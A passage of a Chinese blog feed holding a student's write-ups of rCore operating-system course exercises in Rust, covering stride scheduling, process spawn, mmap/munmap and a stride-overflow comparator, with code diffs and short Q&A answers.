end_va.ceil(),</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // 1. Check if trying to unmap unmapped page</span><span class="token prefix inserted">+</span><span class="token line">        for vpn in vpn_range &#123;</span><span class="token prefix inserted">+</span><span class="token line">            if let Some(pte) = inner.memory_set.translate(vpn) &#123;</span><span class="token prefix inserted">+</span><span class="token line">                if !pte.is_valid() &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    return -1</span><span class="token prefix inserted">+</span><span class="token line">                &#125;</span><span class="token prefix inserted">+</span><span class="token line">            &#125;</span><span class="token prefix inserted">+</span><span class="token line">        &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">        // After checking all errors may occur,</span><span class="token prefix inserted">+</span><span class="token line">        // remove some pages from current memory_set</span><span class="token prefix inserted">+</span><span class="token line">        inner.memory_set.remove_framed_area(vpn_range);</span><span class="token prefix inserted">+</span><span class="token line">        0</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">pub struct TaskControlBlockInner &#123;</span></span>@@ -68,6 +149,18 @@ pub struct TaskControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">    /// Program break</span><span class="token prefix unchanged"> </span><span class="token line">    pub program_brk: usize,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Scheduling priority</span><span class="token prefix inserted">+</span><span class="token line">    pub prio: isize,</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// Scheduling stride</span><span class="token prefix inserted">+</span><span class="token line">    pub stride: isize,</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The syscall times</span><span class="token prefix inserted">+</span><span class="token line">    pub syscall_times: [u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    /// The first time the task was scheduled</span><span class="token prefix inserted">+</span><span class="token line">    pub time: usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlockInner &#123;</span></span>@@ -85,6 +178,13 @@ impl TaskControlBlockInner &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    pub fn is_zombie(&amp;self) -> bool &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        self.get_status() == TaskStatus::Zombie</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    pub fn set_prio(&amp;mut self, prio: isize) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        self.prio = prio;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">    pub fn inc_stride(&amp;mut self) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let pass = BIG_STRIDE / self.prio;</span><span class="token prefix inserted">+</span><span class="token line">        self.stride += pass;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">impl TaskControlBlock &#123;</span></span>@@ -118,6 +218,10 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    exit_code: 0,</span><span class="token prefix unchanged"> </span><span class="token line">                    heap_bottom: user_sp,</span><span class="token prefix unchanged"> </span><span class="token line">                    program_brk: user_sp,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;;</span></span>@@ -191,6 +295,10 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                    exit_code: 0,</span><span class="token prefix unchanged"> </span><span class="token line">                    heap_bottom: parent_inner.heap_bottom,</span><span class="token prefix unchanged"> </span><span class="token line">                    program_brk: parent_inner.program_brk,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">                &#125;)</span><span class="token prefix unchanged"> </span><span class="token line">            &#125;,</span><span class="token prefix unchanged"> </span><span class="token line">        &#125;);</span></span>@@ -206,6 +314,55 @@ impl TaskControlBlock &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        // ---- release parent PCB</span><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    /// parent process spawn the child process</span><span class="token prefix inserted">+</span><span class="token line">    pub fn spawn(self: &amp;Arc&lt;Self>, elf_data: &amp;[u8]) -> Arc&lt;Self> &#123;</span><span class="token prefix inserted">+</span><span class="token line">        let mut parent_inner = self.inner_exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">        // create a user space based upon elf_data</span><span class="token prefix inserted">+</span><span class="token line">        let (memory_set, user_sp, entry_point) = MemorySet::from_elf(elf_data);</span><span class="token prefix inserted">+</span><span class="token line">        let trap_cx_ppn = memory_set</span><span class="token prefix inserted">+</span><span class="token line">            .translate(VirtAddr::from(TRAP_CONTEXT_BASE).into())</span><span class="token prefix inserted">+</span><span class="token line">            .unwrap()</span><span class="token prefix inserted">+</span><span class="token line">            .ppn();</span><span class="token prefix inserted">+</span><span class="token line">        // alloc a pid and a kernel stack in kernel space</span><span class="token prefix inserted">+</span><span class="token line">        let pid_handle = pid_alloc();</span><span class="token prefix inserted">+</span><span class="token line">        let kernel_stack = kstack_alloc();</span><span class="token prefix inserted">+</span><span class="token line">        let kernel_stack_top = kernel_stack.get_top();</span><span class="token prefix inserted">+</span><span class="token line">        let task_control_block = Arc::new(TaskControlBlock &#123;</span><span class="token prefix inserted">+</span><span class="token line">            pid: pid_handle,</span><span class="token prefix inserted">+</span><span class="token line">            kernel_stack,</span><span class="token prefix inserted">+</span><span class="token line">            inner: unsafe &#123;</span><span class="token prefix inserted">+</span><span class="token line">                UPSafeCell::new(TaskControlBlockInner &#123;</span><span class="token prefix inserted">+</span><span class="token line">                    trap_cx_ppn,</span><span class="token prefix inserted">+</span><span class="token line">                    base_size: user_sp,</span><span class="token prefix inserted">+</span><span class="token line">                    task_cx: TaskContext::goto_trap_return(kernel_stack_top),</span><span class="token prefix inserted">+</span><span class="token line">                    task_status: TaskStatus::Ready,</span><span class="token prefix inserted">+</span><span class="token line">                    memory_set,</span><span class="token prefix inserted">+</span><span class="token line">                    parent: Some(Arc::downgrade(self)),</span><span class="token prefix inserted">+</span><span class="token line">                    children: Vec::new(),</span><span class="token prefix inserted">+</span><span class="token line">                    exit_code: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    heap_bottom: parent_inner.heap_bottom,</span><span class="token prefix inserted">+</span><span class="token line">                    program_brk: parent_inner.program_brk,</span><span class="token prefix inserted">+</span><span class="token line">                    prio: 16,</span><span class="token prefix inserted">+</span><span class="token line">                    stride: 0,</span><span class="token prefix inserted">+</span><span class="token line">                    syscall_times: [0u32; MAX_SYSCALL_NUM],</span><span class="token prefix inserted">+</span><span class="token line">                    time: 0usize,</span><span class="token prefix inserted">+</span><span class="token line">                &#125;)</span><span class="token prefix inserted">+</span><span class="token line">            &#125;,</span><span class="token prefix inserted">+</span><span class="token line">        &#125;);</span><span class="token prefix inserted">+</span><span class="token line">        // add child</span><span class="token prefix inserted">+</span><span class="token line">        parent_inner.children.push(task_control_block.clone());</span><span class="token prefix inserted">+</span><span class="token line">        // modify trap_cx</span><span class="token prefix inserted">+</span><span class="token line">        let trap_cx = task_control_block.inner_exclusive_access().get_trap_cx();</span><span class="token prefix inserted">+</span><span class="token line">        *trap_cx = TrapContext::app_init_context(</span><span class="token prefix inserted">+</span><span class="token line">            entry_point,</span><span class="token prefix inserted">+</span><span class="token line">            user_sp,</span><span class="token prefix inserted">+</span><span class="token line">            KERNEL_SPACE.exclusive_access().token(),</span><span class="token prefix inserted">+</span><span class="token line">            kernel_stack_top,</span><span class="token prefix inserted">+</span><span class="token line">            trap_handler as usize,</span><span class="token prefix inserted">+</span><span class="token line">        );</span><span class="token prefix inserted">+</span><span class="token line">        task_control_block</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    /// get pid of process</span><span class="token prefix unchanged"> </span><span class="token line">    pub fn getpid(&amp;self) -> usize &#123;</span><span class="token prefix unchanged"> </span><span class="token line">        self.pid.0</span></span></code></pre><h1 id="问答作业"><a href="#问答作业" class="headerlink" title="问答作业"></a>问答作业</h1><p>stride 算法原理非常简单，但是有一个比较大的问题。例如两个 <code>pass = 10</code> 的进程，使用 8bit 无符号整型储存 stride， <code>p1.stride = 255, p2.stride = 250</code>，在 p2 执行一个时间片后，理论上下一次应该 p1 执行。</p><p><strong>Q1:</strong> 实际情况是轮到 p1 执行吗？为什么？ </p><p><strong>A1:</strong> 不是，对于 8 位无符号整型而言，它能够表示的最大整数为 255，因此当 p2 执行了一个时间片后，<code>p2.stride = p2.stride + pass = 250 + 10 = 4 (overflow!)</code> 。这样，下一次被调度的进程实际上还是 p2.</p><p>我们之前要求进程优先级 &gt;= 2 其实就是为了解决这个问题。可以证明，<strong>在不考虑溢出的情况下</strong>, 在进程优先级全部 &gt;= 2 的情况下，如果严格按照算法执行，那么 <code>STRIDE_MAX – STRIDE_MIN &lt;= BigStride / 2</code>.</p><p><strong>Q2:</strong> 为什么？尝试简单说明（不要求严格证明）。</p><p><strong>A2:</strong> 进程优先级 &gt;= 2，则有 <code>pass &lt;= BigStride / 2</code>，由于调度策略的影响，最大步长与最小步长的差值最大不超过 pass，那么便有 <code>STRIDE_MAX – STRIDE_MIN &lt;= pass &lt;= BigStride / 2</code>.</p><p><strong>Q3:</strong> 已知以上结论，<strong>考虑溢出的情况下</strong>，可以为 Stride 设计特别的比较器，让 <code>BinaryHeap&lt;Stride&gt;</code> 的 pop 方法能返回真正最小的 Stride。补全下列代码中的 <code>partial_cmp</code> 函数，假设两个 Stride 永远不会相等。</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">core<span class="token punctuation">::</span>cmp<span class="token punctuation">::</span></span><span class="token class-name">Ordering</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Stride</span><span class="token punctuation">(</span><span class="token keyword">u64</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">impl</span> <span class="token class-name">PartialOrd</span> <span class="token keyword">for</span> <span class="token class-name">Stride</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">partial_cmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Ordering</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token comment">// ...</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">PartialEq</span> <span class="token keyword">for</span> <span class="token class-name">Stride</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">eq</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>        <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><blockquote><p> TIPS: 使用 8 bits 存储 stride, BigStride = 255, 则: <code>(125 &lt; 255) == false</code>, <code>(129 &lt; 255) == true</code>.</p></blockquote><p><strong>A3:</strong> </p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">core<span class="token punctuation">::</span>cmp<span class="token punctuation">::</span></span><span class="token class-name">Ordering</span><span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token type-definition class-name">Stride</span><span class="token punctuation">(</span><span class="token keyword">u64</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">impl</span> <span class="token class-name">PartialOrd</span> <span class="token keyword">for</span> <span class="token class-name">Stride</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">partial_cmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Ordering</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>        <span class="token keyword">let</span> half <span class="token operator">=</span> <span class="token class-name">BigStride</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token operator">&lt;</span> other<span class="token number">.0</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> other<span class="token number">.0</span> <span class="token operator">-</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token operator">&lt;=</span> half <span class="token punctuation">&#123;</span>                <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Ordering</span><span class="token punctuation">::</span><span class="token class-name">Less</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Ordering</span><span class="token punctuation">::</span><span class="token class-name">Greater</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token keyword">self</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token operator">-</span> other<span class="token number">.0</span> <span class="token operator">&lt;=</span> half <span class="token punctuation">&#123;</span>                <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Ordering</span><span class="token punctuation">::</span><span class="token class-name">Greater</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Ordering</span><span class="token punctuation">::</span><span class="token class-name">Less</span><span class="token punctuation">)</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">impl</span> <span class="token class-name">PartialEq</span> <span class="token keyword">for</span> <span class="token class-name">Stride</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">fn</span> <span class="token function-definition function">eq</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> other<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">Self</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>        <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;编程作业&quot;&gt;&lt;a href=&quot;#编程作业&quot; class=&quot;headerlink&quot; title=&quot;编程作业&quot;&gt;&lt;/a&gt;编程作业&lt;/h1&gt;&lt;h2 id=&quot;思路&quot;&gt;&lt;a href=&quot;#思路&quot; class=&quot;headerlink&quot; title=&quot;思路&quot;&gt;&lt;/a&gt;思路&lt;/h</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Rust" scheme="http://lordaeronesz.github.io/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>2024开源操作系统训练营 rCore Chapter4练习</title>
    <link href="http://lordaeronesz.github.io/2024/11/01/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter4%E7%BB%83%E4%B9%A0/"/>
    <id>http://lordaeronesz.github.io/2024/11/01/2024%E5%BC%80%E6%BA%90%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E8%AE%AD%E7%BB%83%E8%90%A5-rCore-Chapter4%E7%BB%83%E4%B9%A0/</id>
    <published>2024-11-01T15:30:11.000Z</published>
    <updated>2024-11-04T11:43:33.895Z</updated>
    
    <content type="html"><![CDATA[<h1 id="编程作业"><a href="#编程作业" class="headerlink" title="编程作业"></a>编程作业</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="重写-sys-get-time-和-sys-task-info"><a href="#重写-sys-get-time-和-sys-task-info" class="headerlink" title="重写 sys_get_time 和 sys_task_info"></a>重写 <code>sys_get_time</code> 和 <code>sys_task_info</code></h3><p>首先，第一个任务：由于引入了虚拟内存后，<code>sys_get_time</code> 和 <code>sys_task_info</code> 失效了，需要进行重写。</p><p>这里解释一下为什么会失效：以 <code>sys_get_time</code> 为例，用户在发起系统调用时，传入的参数 <code>_ts</code> 是用户态下的虚拟地址，它需要借助内核的软件地址转换机制，查找任务对应的页表，将 <code>_ts</code> 转换为物理地址，再对该地址处的值进行填充。这里可以使用 <code>page_table.rs</code> 中预先实现好的 <code>translated_byte_buffer</code>，它将一整个虚拟地址段翻译为一系列的物理地址段（每页一段），这样如果结构体 <code>TimeVal</code> 和 <code>TaskInfo</code> 横跨多个页面也同样适用。</p><blockquote><p>注意，内核态代码中的地址仍然是虚拟地址，只不过在 rCore 中，内核态的低 256GB 为直接映射，因此好像内核代码在直接访问物理地址，其实还是虚拟地址。</p></blockquote><h3 id="实现-mmap"><a href="#实现-mmap" class="headerlink" title="实现 mmap"></a>实现 <code>mmap</code></h3><p>POSIX 标准中的 <code>mmap</code> 是将一个文件或其他对象的数据映射到进程的地址空间中，而本实验需实现的 <code>mmap</code> 则为简化版本，只是简单地向进程地址空间中插入一段虚拟内存段，而无需为其设置初始值。</p><p>在尝试进行 <code>mmap</code> 之前，需要检查可能发生的错误。按照手册的提示，可能的错误如下：</p><ul><li>start 没有按页大小对齐</li><li><code>port &amp; !0x7 != 0</code> (port 其余位必须为0)</li><li><code>port &amp; 0x7 = 0</code> (这样的内存无意义)</li><li><code>[start, start + len)</code> 中存在已经被映射的页</li><li>物理内存不足</li></ul><p>前三个错误很容易判断，如下所示，在此不必赘述。</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 1. illegal start virtual address or port</span><span class="token keyword">if</span> <span class="token operator">!</span>start_va<span class="token punctuation">.</span><span class="token function">aligned</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span> port <span class="token operator">&amp;</span> <span class="token operator">!</span><span class="token number">0x7</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> port <span class="token operator">&amp;</span> <span class="token number">0x7</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>物理内存是否充足，需要判断尝试映射的内存长度与空闲物理内存的大小关系。rCore 所采用的物理内存策略是简单的栈式分配器，剩余物理内存大小等于 <code>end - current</code> 加上 <code>recycled.len()</code>.</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Check if the remaining physical memory is sufficient</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">is_mem_sufficient</span><span class="token punctuation">(</span>_len<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">bool</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> fa <span class="token operator">=</span> <span class="token constant">FRAME_ALLOCATOR</span><span class="token punctuation">.</span><span class="token function">exclusive_access</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> page_cnt <span class="token operator">=</span> fa<span class="token punctuation">.</span>end <span class="token operator">-</span> fa<span class="token punctuation">.</span>current <span class="token operator">+</span> fa<span class="token punctuation">.</span>recycled<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span>_len <span class="token operator">+</span> <span class="token constant">PAGE_SIZE</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token constant">PAGE_SIZE</span> <span class="token operator">&lt;=</span> page_cnt<span class="token punctuation">&#125;</span></code></pre><p>要判断一段虚拟内存段是否存在已被映射的页面，需要遍历每个页面的起始地址，使用软件地址转换机制尝试对该虚拟地址进行“翻译”，如果成功得到对应的页表项，则说明虚拟页面已被映射，<code>mmap</code> 出错。</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">// 3. Check if trying to map mapped page</span><span class="token keyword">for</span> vpn <span class="token keyword">in</span> vpn_range <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>pte<span class="token punctuation">)</span> <span class="token operator">=</span> inner<span class="token punctuation">.</span>tasks<span class="token punctuation">[</span>cur<span class="token punctuation">]</span><span class="token punctuation">.</span>memory_set<span class="token punctuation">.</span><span class="token function">translate</span><span class="token punctuation">(</span>vpn<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> pte<span class="token punctuation">.</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>检查完所有可能的错误之后，便可以开始进行实际的页面映射了。实际上，在 rCore 中，一个地址空间由若干个逻辑段（<code>MapArea</code>）组成，想要将一段虚拟内存段插入地址空间中，只需要根据 <code>sys_mmap</code> 的参数 start, len, port 构建一个 <code>MapArea</code> 数据结构，再将其插入 <code>memory_set.areas</code> 中（页表项的插入会同时实现）。实际上，rCore 中提供了这样的接口：<code>insert_framed_area</code>。</p><h3 id="实现-munmap"><a href="#实现-munmap" class="headerlink" title="实现 munmap"></a>实现 <code>munmap</code></h3><p>与 <code>mmap</code> 一样，首先检查可能的错误：<code>[start, start + len)</code> 中存在未被映射的虚存，实现方式与 <code>mmap</code> 一样，在此不再介绍。</p><p>实际上，严格的 <code>munmap</code> 实现并不简单，需要考虑将原有的 <code>memeort_set.areas</code> 中的 <code>MapArea</code> 进行进行分割处理。在这里，为了实现的简单，假设 <code>[start, start + len)</code> 正好为一个完整的逻辑段，而非一个更大逻辑段的一部分（测试样例中没有这种情况）。有了这个简化，<code>munmap</code> 就很简单了：只需遍历 <code>memory_set.areas</code> 的各个逻辑段 <code>area</code>，当找到指定逻辑段时，使用 <code>area.unmap()</code> 移除对应的页表项映射，最后将 <code>area</code> 从 <code>memory_set.areas</code> 中移除。</p><pre class="language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// Remove framed area</span><span class="token keyword">pub</span> <span class="token keyword">fn</span> <span class="token function-definition function">remove_framed_area</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> range<span class="token punctuation">:</span> <span class="token class-name">VPNRange</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">let</span> <span class="token keyword">mut</span> idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> area <span class="token keyword">in</span> <span class="token keyword">self</span><span class="token punctuation">.</span>areas<span class="token punctuation">.</span><span class="token function">iter_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> area<span class="token punctuation">.</span>vpn_range<span class="token punctuation">.</span><span class="token function">get_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token operator">==</span> range<span class="token punctuation">.</span><span class="token function">get_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0</span>         <span class="token operator">&amp;&amp;</span> area<span class="token punctuation">.</span>vpn_range<span class="token punctuation">.</span><span class="token function">get_end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token operator">==</span> range<span class="token punctuation">.</span><span class="token function">get_end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0</span> <span class="token punctuation">&#123;</span>            area<span class="token punctuation">.</span><span class="token function">unmap</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">.</span>page_table<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        idx <span class="token operator">+=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">self</span><span class="token punctuation">.</span>areas<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/os/src/mm/frame_allocator.rs b/os/src/mm/frame_allocator.rsindex 01e62fd..e916f1e 100644<span class="token coord">--- a/os/src/mm/frame_allocator.rs</span><span class="token coord">+++ b/os/src/mm/frame_allocator.rs</span><span class="token coord">@@ -2,7 +2,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">//! controls all the frames in the operating system.</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">use super::&#123;PhysAddr, PhysPageNum&#125;;</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">use crate::config::MEMORY_END;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">use crate::config::&#123;MEMORY_END, PAGE_SIZE&#125;;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">use crate::sync::UPSafeCell;</span><span class="token prefix unchanged"> </span><span class="token line">use alloc::vec::Vec;</span><span class="token prefix unchanged"> </span><span class="token line">use core::fmt::&#123;self, Debug, Formatter&#125;;</span></span>@@ -117,6 +117,13 @@ pub fn frame_dealloc(ppn: PhysPageNum) &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    FRAME_ALLOCATOR.exclusive_access().dealloc(ppn);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">/// Check if the remaining physical memory is sufficient</span><span class="token prefix inserted">+</span><span class="token line">pub fn is_mem_sufficient(_len: usize) -> bool &#123;</span><span class="token prefix inserted">+</span><span class="token line">    let fa = FRAME_ALLOCATOR.exclusive_access();</span><span class="token prefix inserted">+</span><span class="token line">    let page_cnt = fa.end - fa.current + fa.recycled.len();</span><span class="token prefix inserted">+</span><span class="token line">    (_len + PAGE_SIZE - 1) / PAGE_SIZE &lt;= page_cnt</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#[allow(unused)]</span><span class="token prefix unchanged"> </span><span class="token line">/// a simple test for frame 